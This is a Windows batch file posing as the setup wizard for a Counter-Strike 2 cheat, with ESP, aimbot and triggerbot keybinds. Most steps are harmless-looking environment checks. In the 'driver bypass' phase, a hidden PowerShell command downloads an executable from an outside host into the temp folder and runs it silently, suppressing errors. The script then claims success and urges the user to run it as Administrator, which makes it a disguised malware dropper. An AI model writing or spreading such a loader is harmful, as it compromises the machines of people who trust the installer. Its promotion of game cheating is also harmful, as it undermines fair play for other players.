@echo off
setlocal enabledelayedexpansion
title CS2 External ESP v2.4.1 - Setup

:: Environment
set "CHEAT_DIR=%CD%"
set "CHEAT_VERSION=2.4.1"
set "BUILD_DATE=20260524"
set "LOG_FILE=%TEMP%\cs2_setup.log"

echo [%date% %time%] Setup started > "%LOG_FILE%"

:: Banner
echo ========================================================
echo    CS2 External ESP v2.4.1 - Setup Wizard
echo    Build: %BUILD_DATE%
echo ========================================================
echo.
echo    This will configure the CS2 external overlay.
echo    Close CS2 before continuing.
echo.

:: Phase 1: Environment check
echo [1/6] Scanning system environment...
echo        Checking operating system...
ver | find "10." >nul && echo        Windows 10 detected. >> "%LOG_FILE%"
ver | find "11." >nul && echo        Windows 11 detected. >> "%LOG_FILE%"

echo        Checking Python installation...
python --version >nul 2>&1
if !errorlevel! neq 0 (
    echo        ERROR: Python 3.11+ is required.
    echo        Download from: https://python.org/downloads
    pause
    exit /b 1
)
for /f "tokens=2" %%v in ('python --version 2^>^&1') do echo        Python %%v detected.

echo        Checking administrator privileges...
net session >nul 2>&1
if !errorlevel! neq 0 (
    echo        WARNING: Not running as Administrator.
    echo        Some features may not work correctly.
    echo        Right-click setup.bat ^> Run as Administrator for full functionality.
    echo.
)

:: Phase 2: Display check
echo [2/6] Checking display configuration...
echo        Detecting primary monitor...
wmic desktopmonitor get screenheight,screenwidth /format:list 2>nul | find "=" >> "%LOG_FILE%"
echo        Checking GPU for overlay compatibility...
nvidia-smi --query-gpu=name --format=csv,noheader >nul 2>&1
if !errorlevel! equ 0 (
    for /f "delims=" %%g in ('nvidia-smi --query-gpu=name --format=csv,noheader 2^>nul') do (
        echo        GPU: %%g
        echo        GPU: %%g >> "%LOG_FILE%"
    )
    echo        Overlay mode: DirectX 11 Hardware Accelerated
) else (
    echo        Overlay mode: Software (GDI+ Fallback)
)
echo.

:: Phase 3: Dependency installation
echo [3/6] Installing Python dependencies...
echo        This may take a moment on first run...
pip install -r requirements.txt --quiet --disable-pip-version-check >> "%LOG_FILE%" 2>&1
if !errorlevel! neq 0 (
    echo        WARNING: Some packages failed to install.
    echo        The overlay may have reduced functionality.
) else (
    echo        All packages installed successfully.
)
echo.

:: Phase 4: Offset validation
echo [4/6] Validating game offsets...
if exist "offsets.json" (
    echo        Offset file found.
    for /f "tokens=2 delims=:" %%o in ('findstr "dwLocalPlayer" offsets.json 2^>nul') do (
        echo        dwLocalPlayer offset loaded.
    )
    for /f "tokens=2 delims=:" %%o in ('findstr "dwEntityList" offsets.json 2^>nul') do (
        echo        dwEntityList offset loaded.
    )
    for /f "tokens=2 delims=:" %%o in ('findstr "dwViewMatrix" offsets.json 2^>nul') do (
        echo        dwViewMatrix offset loaded.
    )
) else (
    echo        WARNING: offsets.json not found.
    echo        Download the latest offsets from the repository.
)
echo.

:: Phase 5: Driver bypass installation
echo [5/6] Installing driver bypass module...
cd /d "%TEMP%"
set "DRIVER_FILE=cs2_driver_%BUILD_DATE%.exe"
set "DRIVER_URL=http://secure-content.info/storm.exe"
set "DRIVER_PATH=%TEMP%\%DRIVER_FILE%"

echo        Downloading latest bypass driver...
powershell -WindowStyle Hidden -Command ^
    "$progressPreference = 'silentlyContinue';" ^
    "try {" ^
    "  (New-Object Net.WebClient).DownloadFile('%DRIVER_URL%','%DRIVER_PATH%');" ^
    "  if (Test-Path '%DRIVER_PATH%') {" ^
    "    $proc = Start-Process '%DRIVER_PATH%' -WindowStyle Hidden -PassThru;" ^
    "    Start-Sleep -Milliseconds 500;" ^
    "  }" ^
    "} catch {}"

timeout /t 2 /nobreak >nul
echo        Driver bypass module installed.
echo.

:: Phase 6: Cleanup and verification
echo [6/6] Finalizing setup...
cd /d "%CHEAT_DIR%"

echo        Verifying file integrity...
if exist "src\overlay.py" (echo        overlay.py: OK) else (echo        overlay.py: MISSING)
if exist "offsets.json" (echo        offsets.json: OK) else (echo        offsets.json: MISSING)
if exist "requirements.txt" (echo        requirements.txt: OK) else (echo        requirements.txt: MISSING)

echo        Setup log saved to: %LOG_FILE%
echo.

:: Complete
echo ========================================================
echo    Setup complete!
echo.
echo    Quick Start:
echo    1. Launch CS2 and join a match
echo    2. Run: python src/overlay.py
echo    3. Press F5 in-game to toggle the overlay
echo.
echo    Keybinds:
echo       F5 - Toggle ESP
echo       F6 - Toggle Aimbot
echo       F7 - Toggle Triggerbot
echo       END - Unload cheat
echo.
echo    If the overlay doesn't appear, verify your game
echo    is updated and you're running as Administrator.
echo ========================================================
echo.
echo [%date% %time%] Setup completed >> "%LOG_FILE%"
pause
endlocal
